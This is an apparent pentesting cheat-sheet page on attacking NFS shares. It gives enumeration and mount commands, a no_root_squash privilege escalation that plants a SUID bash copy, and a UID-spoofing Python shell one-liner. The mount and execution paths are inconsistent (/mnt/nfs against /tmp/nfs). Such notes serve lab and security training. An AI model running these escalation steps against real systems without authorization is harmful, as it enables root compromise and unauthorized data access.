---
title: "NFS"
description: "Enumeration, mounting and privilege escalation techniques for NFS shares."
tags: ["nfs", "network", "service"]
publishDate: 2026-05-18
---

<!-- START doctoc generated TOC please keep comment here to allow auto update -->
<!-- DON'T EDIT THIS SECTION, INSTEAD RE-RUN doctoc TO UPDATE -->

- [Enumeration](#enumeration)
  - [Nmap](#nmap)
  - [List shares](#list-shares)
- [Mount](#mount)
- [Privilege Escalation](#privilege-escalation)
  - [no_root_squash](#no_root_squash)
  - [UID spoofing](#uid-spoofing)

<!-- END doctoc generated TOC please keep comment here to allow auto update -->

NFS (Network File System) runs on **port 2049** and allows remote filesystem mounting over the network.
Common on Linux/Unix environments. Access control is defined in `/etc/exports` on the server.

## Enumeration

### Nmap

```bash
nmap -sV -p 111,2049 $IP
nmap -p 111,2049 --script nfs-* $IP
```

Key scripts:

- `nfs-showmount`: lists exported shares
- `nfs-ls`: lists files in shares
- `nfs-statfs`: retrieves disk stats

### List shares

```bash
showmount -e $IP
rpcinfo -p $IP
```

## Mount

```bash
mkdir /mnt/nfs
mount -t nfs $IP:/share /mnt/nfs
mount -t nfs -o vers=2 $IP:/share /mnt/nfs    # force NFSv2
umount /mnt/nfs
```

## Privilege Escalation

### no_root_squash

If the share is exported with `no_root_squash`, the remote root user keeps root privileges on the share.

Check `/etc/exports` on the server (if readable):

```bash
cat /etc/exports
```

Look for:

```
/share *(rw,no_root_squash)
```

If present, copy a SUID binary onto the share as root from your attacker machine:

```bash
cp /bin/bash /mnt/nfs/bash
chmod +s /mnt/nfs/bash
```

Then execute it on the target with `-p` to keep the SUID effective UID:

```bash
/tmp/nfs/bash -p
```

### UID spoofing

NFS authenticates by UID. If you know a file is owned by UID 1001 on the server, impersonate it directly:

```bash
python3 -c "import os; os.setuid(1001); os.system('/bin/bash')"
```
